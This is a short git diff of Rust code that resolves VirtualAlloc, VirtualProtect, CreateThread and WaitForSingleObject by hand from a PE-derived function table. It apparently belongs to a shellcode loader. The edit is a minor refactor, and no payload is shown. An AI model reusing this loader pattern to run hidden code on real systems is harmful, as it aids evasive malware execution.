@@ -1,4 +1,3 @@
-use crate::dereference_function;
 use crate::util::function_table::{export_dll, FunctionEntry};
 use crate::util::pe_headers::PeHeader;
 use core::ffi::c_void;
@@ -34,18 +33,15 @@ impl Kernel32 {
             .get("VirtualAlloc")
             .expect("Failed to get function")
             .address;
+
         let virtualalloc: unsafe extern "C" fn(*mut c_void, usize, u32, u32) -> *mut c_void =
             transmute(pvirtualalloc);
-
-        let virtualalloc = dereference_function!(
-            pvirtualalloc,
-            unsafe extern "C" fn(*mut c_void, usize, u32, u32) -> *mut c_void
-        );
 
         let pvirtualprotect: *mut c_void = function_table
             .get("VirtualProtect")
             .expect("Failed to get function")
             .address;
+
         let virtualprotect: unsafe extern "C" fn(
             lpaddress: *const c_void,
             dwsize: usize,
@@ -57,6 +53,7 @@ impl Kernel32 {
             .get("CreateThread")
             .expect("Failed to get function")
             .address;
+        
         // TODO error handling for thread return (if you really care about that lol)
         let createthread: unsafe extern "C" fn(
             lpthreadattributes: *const c_void,
@@ -71,6 +68,7 @@ impl Kernel32 {
             .get("WaitForSingleObject")
             .expect("Failed to get function")
             .address;
+        
         let waitforsingleobject: unsafe extern "C" fn(hhandle: isize, dwmilliseconds: u32) -> () =
             transmute(pwaitforsingleobject);
 
